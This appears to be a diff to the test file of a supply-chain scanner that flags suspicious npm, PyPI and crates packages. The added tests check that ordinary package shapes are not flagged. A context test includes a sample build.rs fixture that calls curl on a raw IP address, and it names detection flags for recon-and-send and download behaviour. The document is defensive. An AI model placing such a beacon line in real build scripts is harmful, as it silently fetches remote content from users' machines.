@@ -32,7 +32,7 @@ def test_docs_and_binaries():
 
 def test_behaviour_rules_raise_the_funnel_score():
     scan = {"score": 0, "level": "none", "findings": [], "rules_matched": []}
-    combined = package_features.combine(scan, ["system_info", "http_send", "inflated_version"], "npm")
+    combined = package_features.combine(scan, ["system_info", "http_send", "inflated_version", "tiny_package"], "npm")
     assert combined["level"] == "alert" and {"BEH_RECON_AND_SEND", "BEH_DEPENDENCY_CONFUSION"} <= set(combined["rules_matched"])
     assert package_features.combine(scan, ["system_info"], "npm") is scan
     assert package_features.combine(scan, ["system_info", "http_send"], "pypi") is scan, "npm-only rule"
@@ -42,3 +42,17 @@ def test_build_rs_beacon_rule():
     flags = package_features.profile([("pkg-1.0.0/build.rs", b'fn main(){ std::process::Command::new("curl").arg("-s").arg("http://1.2.3.4/x").status().unwrap(); }')])
     assert {"build_rs", "build_rs_side_effects", "download_tool", "raw_ip_url"} <= set(flags)
     assert "BEH_BUILD_RS_BEACON" in package_features.combine({"score": 0, "findings": [], "rules_matched": []}, flags, "crates")["rules_matched"]
+
+
+def test_benchmark_false_positive_shapes_stay_quiet():
+    scan = {"score": 0, "level": "none", "findings": [], "rules_matched": []}
+    # pnpm / vitest: recon + network in a large package with ordinary install hooks
+    assert package_features.combine(scan, ["system_info", "http_send", "home_dir", "install_hook", "child_process"], "npm") is scan
+    # calendar and long-lived versions are not dependency confusion
+    assert "inflated_version" not in package_features.profile([("p/setup.py", b"")], version="2026.9.0")
+    assert "inflated_version" not in package_features.profile([("p/setup.py", b"")], version="84.0.0")
+    assert "inflated_version" in package_features.profile([("p/setup.py", b"")], version="99.0.0")
+    # setup.py that only checks the platform
+    assert package_features.combine(scan, ["setup_py_side_effects", "system_info", "http_send"], "pypi") is scan
+    # type declarations are not code
+    assert package_features.profile([("package/index.d.ts", b"export function hostname(): string; // os.hostname()")]) == ["tiny_package"]
